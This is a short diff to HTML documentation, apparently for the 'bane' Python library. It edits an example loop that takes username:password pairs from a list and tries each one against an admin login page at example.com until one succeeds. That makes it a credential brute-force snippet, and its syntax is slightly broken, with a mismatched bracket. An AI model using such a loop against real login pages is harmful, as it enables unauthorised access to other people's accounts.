@@ -391,7 +391,7 @@ we can access and enumerate some or all internal admin panel pages using this me
 <br>&nbsp;user=x.split(":")[0]
 <br>&nbsp;pwd=x.split(":")[1]
 <br>&nbsp;print'"[*]Trying:",user,pwd
-<br>&nbsp;if bane.adminlogin("http://example.com/admin/login.php",{'username':user,'password':pwd)==1:
+<br>&nbsp;if bane.adminlogin("http://example.com/admin/login.php",{'username':user,'password':pwd)==True:
 <br>&nbsp;&nbsp;print'[+]Found'
 <br>&nbsp;&nbsp;break
 <br>&nbsp;else:
